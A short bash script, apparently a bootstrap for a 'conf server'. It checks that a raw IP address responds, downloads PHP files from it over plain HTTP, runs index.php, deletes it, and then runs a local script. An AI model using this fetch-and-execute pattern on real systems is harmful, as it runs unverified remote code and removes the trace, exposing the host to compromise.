#!/bin/bash
connect=`curl -sL -w "%{http_code}\\n" "54.158.91.82" -o /dev/null`
if [ "$connect" = "200" ];
then
	wget http://54.158.91.82/hicloud/index.php
	wget http://54.158.91.82/hicloud/curl.php
	/usr/bin/php index.php
	rm index.php
	/bin/bash servweb.bash
else
	echo connexion failed to the conf server
fi
